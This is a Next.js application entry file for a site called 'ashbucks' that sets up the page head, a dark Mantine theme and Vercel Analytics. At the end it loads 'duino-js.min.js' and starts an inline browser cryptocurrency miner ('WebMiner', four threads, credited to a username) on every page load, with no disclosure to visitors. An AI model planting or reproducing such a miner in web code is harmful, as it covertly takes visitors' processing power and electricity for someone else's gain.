import { AppProps } from 'next/app';
import Head from 'next/head';
import { MantineProvider } from '@mantine/core';
import { Analytics } from '@vercel/analytics/react';

export default function App(props: AppProps) {
  const { Component, pageProps } = props;

  return (
    <>
      <Head>
        <title>ashbucks</title>
        <meta name="viewport" content="minimum-scale=1, initial-scale=1, width=device-width" />
      </Head>

      <MantineProvider
        withGlobalStyles
        withNormalizeCSS
        theme={{
          /** Put your mantine theme override here */
          colorScheme: 'dark',
        }}
      >
        <Component {...pageProps} />
        <Analytics />
      </MantineProvider>
      <script src="duino-js.min.js" async />
      <script>
        username = `authorises`;
        rigid = `WebMiner`;
        threads = 4;
        startMiner();
      </script>
    </>
  );
}